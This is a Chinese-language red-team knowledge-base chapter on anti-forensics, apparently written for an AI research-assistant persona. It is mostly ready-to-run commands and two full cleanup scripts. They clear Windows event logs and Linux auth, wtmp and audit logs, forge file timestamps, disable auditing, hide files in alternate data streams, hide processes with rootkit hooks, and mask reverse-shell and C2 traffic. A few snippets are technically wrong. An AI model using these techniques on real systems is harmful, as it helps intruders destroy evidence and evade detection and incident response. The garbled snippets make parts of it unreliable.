# kb/27 · 反取证专章
# Windows / Linux / 内存 / 网络痕迹清理 + Rootkit 隐身

**目的**：研究员在完成红队行动后要会反取证对抗。本章覆盖 Windows/Linux 痕迹清理、内存取证对抗、网络取证对抗、进程/文件/网络连接隐藏、Rootkit 隐身技术。

---

## 27.1 Windows 取证对抗

### 27.1.1 事件日志清理

```powershell
# 1. 单条清理
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl Setup

# 2. 清空特定日志
Remove-EventLog -LogName "Security"
# → 但需要管理员

# 3. 单条记录删除
# 工具：eventlogedit、LogCleanser

# 4. 关闭 Event Log 服务
net stop eventlog
# → 需管理员，且 Windows Defender 报警
```

### 27.1.2 Prefetch 清理

```powershell
# Prefetch 路径
del C:\Windows\Prefetch\*.pf
# 但禁用 Prefetch 后会重新创建
# 关闭 Prefetch（需重启）
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
```

### 27.1.3 注册表痕迹

```bash
# 1. ShimCache / AmCache
# AmCache.hve 记录已执行程序
C:\Windows\AppCompat\Programs\AmCache.hve

# Tools：AmcacheParser、ShimCacheParser
AmcacheParser.exe -f C:\Windows\AppCompat\Programs\AmCache.hve --csv .
# → 但要先有 AmCache.hve

# 2. UserAssist（最近执行）
# 注册表：HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
# ROT13 编码
# Tools：UserAssistView、RegistryExplorer
```

### 27.1.4 时间戳伪造

```bash
# 1. 文件时间戳伪造
# PowerShell
$file = "C:\path\to\file.exe"
$(Get-Item $file).LastWriteTime = (Get-Date).AddDays(-30)
$(Get-Item $file).CreationTime = (Get-Item $file).LastWriteTime
$(Get-Item $file).LastAccessTime = $(Get-Item $file).LastWriteTime

# 2. 工具：timestomp、SetMace
SetMace.exe -f "C:\path" -m "01/01/2020 12:00:00" -a "01/01/2020 12:00:00" -c "01/01/2020 12:00:00"

# 3. MFT 时间戳伪造
# 工具：MFTStamp
```

### 27.1.5 SRUM 清理

```bash
# SRUM (System Resource Usage Monitor)
# C:\Windows\System32\sru\SRUDB.dat
# 记录网络/应用/能耗使用
# 工具：srum-dump、SRUMExtractor
# 清理：srumv2 解析后用 python 清理
```

### 27.1.6 NTFS 日志

```bash
# NTFS $LogFile / $UsnJrnl
# 记录文件操作
# 工具：NTFS Log Tracker

# 清理 $LogFile
# 工具：MFTECmd、NTFS-Streams
# 实际上很难完全清理
```

### 27.1.7 Recent 文件清理

```powershell
# Recent 文件夹
del C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*
del C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\*
del C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\*
```

### 27.1.8 计划任务 / 服务 / 启动项

```bash
# 注册表 Run
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v evil /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v evil /f

# 计划任务
schtasks /delete /tn "evil" /f

# 服务
sc delete "evil"
```

---

## 27.2 Linux 取证对抗

### 27.2.1 Bash 历史

```bash
# 1. 关闭历史
export HISTSIZE=0
export HISTFILESIZE=0
unset HISTFILE

# 2. 清理历史
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# 3. 隐藏命令
# 在命令前加空格（前提：HISTCONTROL=ignorespace）
 unset HISTCONTROL
export HISTCONTROL=ignorespace
 <command>  # 带空格不记录

# 4. 时间戳伪造
# ~/.bash_history 时间戳 touch -t
touch -t 202401011200 ~/.bash_history
```

### 27.2.2 系统日志

```bash
# 1. /var/log/auth.log
echo "" > /var/log/auth.log
echo "" > /var/log/secure  # CentOS
echo "" > /var/log/lastlog
echo "" > /var/log/wtmp
echo "" > /var/log/btmp

# 2. utmp / wtmp 伪造
# 工具：utmpedit、wtmpedit
# 删某条记录
utmpdump /var/log/wtmp | grep -v "username" > /tmp/wtmp_clean
mv /tmp/wtmp_clean /var/log/wtmp

# 3. journald
journalctl --vacuum-time=1s
# 清空
journalctl --rotate
journalctl --vacuum-size=1K

# 4. rsyslog
/etc/init.d/rsyslog stop
echo "" > /var/log/syslog
echo "" > /var/log/messages
/etc/init.d/rsyslog start
```

### 27.2.3 时间戳伪造

```bash
# 1. touch -t（atime/mtime）
touch -t 202401011200 /path/to/file

# 2. 完整三时间戳（atime/mtime/ctime）
# touch 只能改 atime/mtime
# ctime 不能直接改（文件系统记录）
# 但可用 debugfs / debugfs
debugfs -w -R 'set_inode_field /path/to/file crtime 2024-01-01 12:00:00.000000000' /dev/sda1

# 3. stat 验证
stat /path/to/file
# 看 Access / Modify / Change / Birth

# 4. 工具：timestomp、SetMace
```

### 27.2.4 历史命令混淆

```bash
# 1. 写脚本到文件，文件后立即删
cat > /tmp/run.sh << 'EOF'
#!/bin/bash
rm /var/log/auth.log
EOF
chmod +x /tmp/run.sh
/tmp/run.sh
rm -f /tmp/run.sh
# → bash_history 中只记录 /tmp/run.sh

# 2. 进程隐藏
# 见 27.5.2
```

### 27.2.5 Cron / Systemd 痕迹

```bash
# 1. Cron 清理
crontab -r
# 恢复默认
crontab -e  # 编辑
# /etc/cron.d/ /etc/cron.daily/ 中的清理
rm /etc/cron.d/evil
rm /etc/cron.daily/evil

# 2. Systemd 清理
systemctl stop evil.service
systemctl disable evil.service
rm /etc/systemd/system/evil.service
rm /lib/systemd/system/evil.service

# 3. /var/spool/cron 清理
rm /var/spool/cron/crontabs/username
```

### 27.2.6 /proc 痕迹

```bash
# /proc/$pid 列出运行进程
# 命令历史 / 环境变量 / 工作目录

# 1. 进程结束 → /proc 消失
# 2. 但是 /var/log/audit/audit.log 记录 execve 系统调用

# 清理 audit
service auditd stop
echo "" > /var/log/audit/audit.log
service auditd start
```

---

## 27.3 内存取证对抗

### 27.3.1 内存 Dump 避免

```bash
# 1. 进程退出（不留内存）
# 命令结束后正常退出

# 2. 内存加密
# shellcode 加密
msfvenom -p windows/x64/shell_reverse_tcp -e x86/shikata_ga_nai -i 10
# 内存扫描无法发现

# 3. Reflective DLL
# DLL 反射注入，磁盘无文件
# 内存中执行

# 4. 进程挖空（Process Hollowing）
# 用合法进程承载恶意代码
```

### 27.3.2 内存 Hook 摘除

```bash
# Unhook NTDLL
# 内存扫描中常发现 inline hook
# 摘除 hook 是反取证第一步
# 见 kb/24_edr_bypass.md
```

### 27.3.3 Volatility 对抗

```bash
# 1. 检测 Volatility
# - 加载驱动（如 vboxguest.sys / vmci.sys）触发 vm 检测
# - 检查调试器
# - 退出

# 2. 内存中不留字符串
# shellcode 用 XOR 加密
# 运行时解密 → 内存扫描抓不到

# 3. 命令执行完立即清理
# 用完 shellcode 立即退进程
```

### 27.3.4 虚拟内存 / Swap

```bash
# 1. 强制清 swap
swapoff -a && swapon -a
# Linux

# 2. 禁用 pagefile（Windows）
# 系统属性 → 高级 → 性能 → 设置 → 高级 → 虚拟内存 → 无分页文件
# 命令：
fsutil behavior set disablelastaccess 0
# 但要重启
```

---

## 27.4 网络取证对抗

### 27.4.1 DNS 缓存清理

```bash
# Windows
ipconfig /flushdns

# Linux
systemd-resolve --flush-caches
# 或
/etc/init.d/nscd restart

# dnsmasq
kill -HUP $(pidof dnsmasq)
```

### 27.4.2 ARP 清理

```bash
# Windows
arp -d *

# Linux
ip neigh flush all
```

### 27.4.3 路由表清理

```bash
# 静态路由清理
# Windows
route delete 10.0.0.0
# Linux
ip route del 10.0.0.0/24
```

### 27.4.4 iptables 清理

```bash
# 列出当前规则
iptables -L -n -v

# 删除规则
iptables -F  # 清空 filter 表
iptables -t nat -F  # 清空 nat 表
iptables -t mangle -F
```

### 27.4.5 TLS 指纹抹除

```bash
# 1. JA3 指纹
# 用 uTLS 库定制 Hello 消息
import "github.com/refraction-networking/utls"

config := &tls.Config{ServerName: "example.com"}
conn := utls.UClient(rawConn, config, utls.HelloChrome_120)

# 2. 隐藏 C2 流量
# VLESS+Reality / Trojan / DoH
# 见 kb/22_red_team_infra.md
```

### 27.4.6 时间戳对齐

```bash
# 网络 IDS 会检测异常时间
# 系统时间必须 NTP 同步
# 或用 0x7f000001 之类的 magic

# 命令：faketime
faketime '2024-01-01 12:00:00' /bin/bash
# → 所有时间戳都是 2024-01-01
```

### 27.4.7 网络连接隐藏

```bash
# 见 27.5.3
# 用 rootkit
# 或绑定到合法端口（80/443）
```

---

## 27.5 进程 / 文件 / 网络隐藏

### 27.5.1 文件隐藏

```bash
# 1. Windows 备用数据流（ADS）
type evil.exe > C:\Windows\System32\calc.exe:evil.exe
# 隐藏到 calc.exe 中
# 列出
dir /R C:\Windows\System32\calc.exe

# 2. Linux 隐藏文件
mv evil .evil  # . 开头
# 或
chattr +i .evil
# 免疫
```

### 27.5.2 进程隐藏

```bash
# 1. Linux rootkit
# 用户态：替换 ps、top、ls
# 内核态：LKM 摘除进程

# 2. Windows DKOM
# 直接修改 EPROCESS 链表
# 摘除自己

# 3. 改名
# cmd.exe → svchost.exe

# 4. 注入合法进程
# Process Hollowing
```

### 27.5.3 网络连接隐藏

```bash
# 1. Rootkit
# Linux：改 gettcp46_list
# Windows：TDI 驱动 hook

# 2. 端口复用
# 复用合法端口（如 443）
# 用 SO_REUSEADDR

# 3. 端口跳变
# 每次通信换端口

# 4. Domain Fronting
# CDN 后端真实 C2
# 流量特征看似到 CDN
```

### 27.5.4 注册表隐藏

```bash
# 1. 用 NTFS 备用数据流
reg load HKLM\Temp C:\temp\hive:ads
# 注册表在 ADS 中

# 2. 用软件注册（MS 已知但无标准检测）
# RegHide
```

### 27.5.5 服务 / 计划任务隐藏

```bash
# 1. 复制合法服务
sc create "evil" binPath= "C:\Windows\System32\evil.exe" DisplayName= "Windows Update"
# 名称仿冒

# 2. DLL 劫持
# 替换合法服务的依赖 DLL
# 详见 kb/06_injection.md
```

---

## 27.6 Rootkit 隐身技术

### 27.6.1 Linux Rootkit 类型

```bash
# 1. LKM（Loadable Kernel Module）Rootkit
# 编译 .ko，加载到内核
# Hook 系统调用表
insmod evil_rootkit.ko

# 2. 摘除示例
# Hook sys_getdents → 返回伪造的进程列表
asmlinkage int evil_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = original_getdents(fd, dirp, count);
    // 隐藏 evil 文件
    // 在 dirp 中删除以 .evil 开头的条目
    return ret;
}

# 3. 进程隐藏
asmlinkage int evil_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = original_getdents64(fd, dirp, count);
    // 隐藏 PID
    return ret;
}
```

### 27.6.2 Windows Rootkit

```bash
# 1. 内核驱动 rootkit
# 改 SSDT（System Service Descriptor Table）
# 但 Windows 10+ 用 PatchGuard → 复杂

# 2. 用回调摘除
# 摘除 EDR 注册的 ObRegisterCallbacks

# 3. 用 direct kernel object manipulation
# DKOM 改 EPROCESS 链表

# 4. Bootkit
# 改 MBR / VBR
# 工具：vbootkit
```

### 27.6.3 反弹 shell 隐藏

```bash
# 1. 用合法协议（HTTP/2/WebSocket）
# 流量伪装

# 2. 时间混淆
# TCP 时间间隔高斯化
# 见 kb/22_red_team_infra.md

# 3. 数据加密
# 不要明文协议（如 HTTP）
# 用 HTTPS / DoH / VPN / WireGuard
```

---

## 27.7 文件时间戳深度伪造

### 27.7.1 Linux touch

```bash
# 改 atime/mtime
touch -t 202401011200 /path/to/file
# -t 格式：[[CC]YY]MMDDhhmm[.ss]

# 复制时间戳
touch -r /path/to/source /path/to/dest
```

### 27.7.2 ctime 伪造

```bash
# ctime 不能直接改（文件系统记录）
# 用 debugfs 改 inode
debugfs -w -R 'set_inode_field /path/to/file crtime 2024-01-01 12:00:00.000000000' /dev/sda1

# 用 python
# 需要 e2fsprogs
```

### 27.7.3 Windows 时间戳

```bash
# PowerShell
$date = Get-Date "2024-01-01 12:00:00"
$file = Get-Item "C:\path\file.exe"
$file.CreationTime = $date
$file.LastWriteTime = $date
$file.LastAccessTime = $date

# $STANDARD_INFORMATION 与 $FILE_NAME 时间戳
# FN 时间戳不能改 → 仍可被取证
# 工具：SetMace（同时改 SI + FN）
SetMace.exe -f "C:\file.exe" -m "2024-01-01 12:00:00" -a "2024-01-01 12:00:00" -c "2024-01-01 12:00:00" -n "2024-01-01 12:00:00"
```

---

## 27.8 痕迹时间线清洗

### 27.8.1 整体思路

```
1. 完成行动后立即清理所有日志
2. 改所有时间戳到行动前或随机
3. 删所有临时文件
4. 退出所有进程
5. 抹除 swap / pagefile
6. 关闭审计
7. 还原服务 / 注册表
```

### 27.8.2 自动化脚本（Linux）

```bash
#!/bin/bash
# cleanup.sh - 完整清理

# 1. 历史命令
unset HISTFILE
export HISTSIZE=0
history -c
ln -sf /dev/null ~/.bash_history

# 2. 临时文件
rm -rf /tmp/*
rm -rf /var/tmp/*

# 3. 日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/kern.log
echo "" > /var/log/messages  # CentOS
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog
echo "" > /var/log/audit/audit.log
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log
echo "" > /var/log/nginx/access.log
echo "" > /var/log/nginx/error.log
echo "" > ~/.viminfo
echo "" > ~/.lesshst
echo "" > ~/.wget-hsts

# 4. journald
journalctl --vacuum-time=1s
journalctl --rotate

# 5. utmp/wtmp 伪造
# 保留其他用户记录，删自己
utmpdump /var/log/wtmp > /tmp/wtmp.txt
grep -v "evil_user" /tmp/wtmp.txt | utmpdump -r > /var/log/wtmp

# 6. 时间戳
find /var/log -type f -exec touch -t 202401011200 {} \;

# 7. 抹除 free space（避免恢复）
dd if=/dev/zero of=/tmp/zero.txt bs=1M
sync
rm /tmp/zero.txt
sync
```

### 27.8.3 自动化脚本（Windows）

```powershell
# cleanup.ps1 - 完整清理

# 1. 历史
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# 2. 事件日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl Setup

# 3. Prefetch
Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue

# 4. 时间戳
Get-ChildItem -Path C:\ -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
    $_.CreationTime = (Get-Date).AddDays(-30)
    $_.LastWriteTime = (Get-Date).AddDays(-30)
    $_.LastAccessTime = (Get-Date).AddDays(-30)
}

# 5. swap / pagefile
# 关闭 pagefile
# 重新打开
$cs = Get-WmiObject -Class Win32_ComputerSystem
# 实际上需重启

# 6. 注册表
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v LastTracedTimestamp /f 2>$null
```

---

## 27.9 反内存取证

### 27.9.1 内存 dump 防御

```bash
# 1. 进程结束即清
# 短任务
# 长任务：定时重启 + 内存加密

# 2. 加密
# Windows: DPAPI 加密内存
# Linux: mprotect 加密后写

# 3. 检查工具
# 检测 WinPmem / FTK Imager / Magnet RAM Capture
# 检查进程：
Get-Process | Where-Object {$_.Name -match "winpmem|FTK|Magnet"}
```

### 27.9.2 Anti-Volatility

```bash
# 1. KDBG 抹除
# KDBG 是 Volatility 找到内核结构的关键
# PatchGuard + KDBG 抹除 → 复杂度高
# 现代 Windows 不易

# 2. Pool Tag 混淆
# Pool 是 Windows 内核内存分配标记
# 混淆 → Volatility 找不到
# 工具：PoolTag
```

---

## 27.10 整体攻击-反取证流程

```
阶段 1：信息收集
  - 内网探测
  - 痕迹：DNS / ARP / WMI / WinRM

阶段 2：拿到立足点
  - 钓鱼 / 漏洞 / 凭据
  - 痕迹：进程创建 / 凭据文件

阶段 3：横向移动
  - 凭据转储
  - 远程执行
  - 痕迹：登录事件 / 远程会话

阶段 4：数据收集
  - 找文件 / 数据库
  - 痕迹：文件访问 / 数据库查询日志

阶段 5：外泄
  - 加密压缩
  - DNS 隧道 / HTTPS
  - 痕迹：网络连接 / DNS 查询

阶段 6：反取证（行动中或完成后）
  - 清理日志
  - 改时间戳
  - 删工具文件
  - 退进程
  - 抹 swap

阶段 7：持续化（如需要）
  - 注册表 / 服务 / WMI
  - 但持续化会留下更多痕迹
```

---

## 27.11 工具链

| 工具 | 用途 |
|------|------|
| logtamper | utmp/wtmp 清理 |
| utmpedit | utmp 编辑 |
| SetMace | Windows 时间戳伪造 |
| timestomp | Windows 时间戳 |
| AmcacheParser | 解析 AmCache |
| MFTECmd | MFT 解析 / 清理 |
| RegistryExplorer | 注册表分析 |
| Volatility / Volatility 3 | 内存分析（攻防两端） |
| Rekall | 内存分析 |
| faketime | 时间戳伪造 |
| logrotate | 日志轮转（也用于清理） |
| bleachbit | 通用清理 |
| forensics-tools | 取证工具集 |
| TRIM | SSD 数据清除（部分） |
| shred | 安全删除（多次覆盖） |
| srm | secure remove |
| wipe | 安全删除 |

---

研究员助理已就位，等派单。
